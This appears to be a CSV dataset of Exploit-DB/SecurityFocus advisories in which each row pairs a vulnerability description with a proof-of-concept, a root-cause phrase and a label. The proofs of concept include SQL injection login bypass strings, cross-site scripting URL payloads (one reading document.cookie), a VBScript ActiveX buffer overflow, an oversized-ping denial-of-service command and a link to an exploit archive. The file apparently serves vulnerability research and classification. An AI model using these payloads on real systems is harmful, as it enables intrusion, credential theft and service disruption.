27003,"InTouch 0.5.1 Alpha - User Variable SQL Injection source: https://www.securityfocus.com/bid/16110/info  inTouch is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  http://www.example.com/index.php  username: a' or 'a'='a'/* password: anypassword",a failure in the application to properly sanitize user-supplied input before using it in an SQL query,1
26986,PaperThin CommonSpot Content Server 4.5 - Cross-Site Scripting source: https://www.securityfocus.com/bid/16071/info  PaperThin CommonSpot Content Server is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   /loader.cfm?url=/[DIRPATH]/[DIRPATH]/email-login-info.cfm&errmsg=No%20user%20account %20was%20found%20for%20that%20email%20address.%20%20Please%20try%20again.&bNewWindo w=[XSS],a failure in the application to properly sanitize user-supplied input,1
38501,Cisco Linksys E4200 - '/apply.cgi' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/59558/info  The Cisco Linksys E1200 N300 router is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Cisco Linksys E1200 N300 running firmware 2.0.04 is vulnerable.   http://www.example.com/apply.cgi?submit_button=%27%3b%20%3C%2fscript%3E%3Cscript%3Ealert%281%29%3C%2fscript%3E%20%27  http://www.example.com/apply.cgi?submit_button=index%27%3b%20%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e%20%27&change_action=&submit_type=&action=Apply&now_proto=dhcp&daylight_time=1&switch_mode=0&hnap_devicename=Cisco10002&need_reboot=0&user_language=&wait_time=0&dhcp_start=100&dhcp_start_conflict=0&lan_ipaddr=4&ppp_demand_pppoe=9&ppp_demand_pptp=9&ppp_demand_l2tp=9&ppp_demand_hb=9&wan_ipv6_proto=dhcp-tunnel&detect_lang=EN&wan_proto=dhcp&wan_hostname=&wan_domain=&mtu_enable=0&lan_ipaddr_0=192&lan_ipaddr_1=168&lan_ipaddr_2=1&lan_ipaddr_3=1&lan_netmask=255.255.255.0&machine_name=Cisco10002&lan_proto=dhcp&dhcp_check=&dhcp_start_tmp=100&dhcp_num=50&dhcp_lease=0&wan_dns=4&wan_dns0_0=0&wan_dns0_1=0&wan_dns0_2=0&wan_dns0_3=0&wan_dns1_0=0&wan_dns1_1=0&wan_dns1_2=0&wan_dns1_3=0&wan_dns2_0=0&wan_dns2_1=0&wan_dns2_2=0&wan_dns2_3=0&wan_wins=4&wan_wins_0=0&wan_wins_1=0&wan_wins_2=0&wan_wins_3=0&time_zone=-08+1+1&_daylight_time=1,fails to sufficiently sanitize user-supplied data,1
23920,"Mcafee FreeScan CoMcFreeScan Browser - Object Buffer Overflow (PoC) source: https://www.securityfocus.com/bid/10071/info  It has been reported that Mcafee FreeScan CoMcFreeScan browser object may be prone to a remote buffer overflow vulnerability. The issue is reportedly due to a lack of sufficient boundary checks performed on data assigned to the object variable 'ScanParam'.  A remote attacker may craft a website which, when viewed, would result in arbitrary code execution in the context of the user who is running the browser with an affected browser object installed.   <script language=vbscript> dim mymy2,a  a= ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"" a= a & ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa""  Set mymy2= CreateObject(""McFreeScan.CoMcFreeScan.1"") msgbox mymy2.GetSpecialFolderLocation(&H0024) msgbox mymy2.GetSpecialFolderLocation(&H0005) mymy2.ScanParam = ""c:\"" & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & a & ""\"" mymy2.Scan </script>Press O.K<BR>Press O.K<BR>Now Close The Window",a lack of sufficient boundary checks performed on data assigned to the object variable 'ScanParam',1
27894,obotix IP Camera M1 1.9.4 .7/M10 2.0.5.2 - 'eventplayer?get_image_info_abspath' Cross-Site Scripting source: https://www.securityfocus.com/bid/18022/info    The Mobotix IP camera is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the device to properly sanitize user-supplied input.     An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.    http://www.example.com/control/eventplayer?get_image_info_abspath=%3CBODY%20ONLOAD=alert(&#039;www.eazel.es&#039;)%3E,a failure in the device to properly sanitize user-supplied input,1
33925,ecoCMS 18.4.2010 - 'admin.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/39901/info  ecoCMS is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  ecoCMS 18.04.2010 is vulnerable; prior versions may also be affected.   http://www.example.com/admin.php?p=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,fails to properly sanitize user-supplied input,1
31306,"Nortel UNIStim IP Phone - Remote Ping Denial of Service source: https://www.securityfocus.com/bid/28004/info  Nortel UNIStim IP Phone products are prone to a remote denial-of-service vulnerability because the software fails to properly handle unexpected network datagrams.  Successfully exploiting this issue allows remote attackers to crash affected phones, denying service to legitimate users.  Phones with firmware 0604DAS are vulnerable to this issue. Other versions are also reportedly affected, but we don't know which specific versions.   The following command will demonstrate this issue:  ping -s 65500 <target>",the software fails to properly handle unexpected network datagrams,1
23152,"Yahoo! Webcam ActiveX Control 2.0.0.107 - Buffer Overrun source: https://www.securityfocus.com/bid/8634/info  A buffer overrun has been discovered in the Yahoo! Webcam ActiveX control. The problem occurs due to insufficient bounds checking when handling user-supplied Webcam parameters. As a result, an attacker may be capable of hosting a malicious website designed to exploit this issue to execute arbitrary code, within the context of a victim users web browser.    <object id=""yahoowebcam"" classid=""CLSID:E504EE6E-47C6-11D5-B8AB-00D0B78F3D48"" > </object> <script> yahoowebcam.TargetName=""longstringhere""; </script>",insufficient bounds checking when handling user-supplied Webcam parameters,1
27073,"Microsoft Visual Studio - UserControl Remote Code Execution (2) source: https://www.securityfocus.com/bid/16225/info   Microsoft Visual Studio is prone to a vulnerability that could allow remote attackers to execute arbitrary code. This issue stems from a design flaw that executes code contained in a project file without first notifying users.   Exploiting this issue allows attackers to execute arbitrary code in the context of the user viewing a malicious project file. Since viewing a project file is usually considered a safe operation, users may have a false sense of security by attempting to inspect unknown code before compiling or executing it.   This vulnerability may be remotely exploited due to project files originating from untrusted sources.   Visual Studio 2005 is reportedly vulnerable to this issue; other versions may also be affected.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/27073.zip",project files originating from untrusted 